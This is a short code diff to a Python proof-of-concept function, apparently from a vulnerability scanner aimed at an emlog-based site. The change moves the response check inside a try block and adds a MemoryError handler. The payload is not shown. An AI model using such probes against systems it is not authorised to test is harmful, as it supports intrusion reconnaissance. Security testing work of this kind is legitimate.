@@ -52,8 +52,10 @@ def poc(url):
         header["Referer"] = url
         try:
             resp = requests.get(payload,headers=header,timeout=15)
+            if resp.status_code == 200 and 'x.hacking8.com/content/templates/emlog_dux' in resp.text:
+                return payload
+        except MemoryError:
+            continue
         except:
             continue
-        if resp.status_code == 200 and 'x.hacking8.com/content/templates/emlog_dux' in resp.text:
-            return payload
     return False
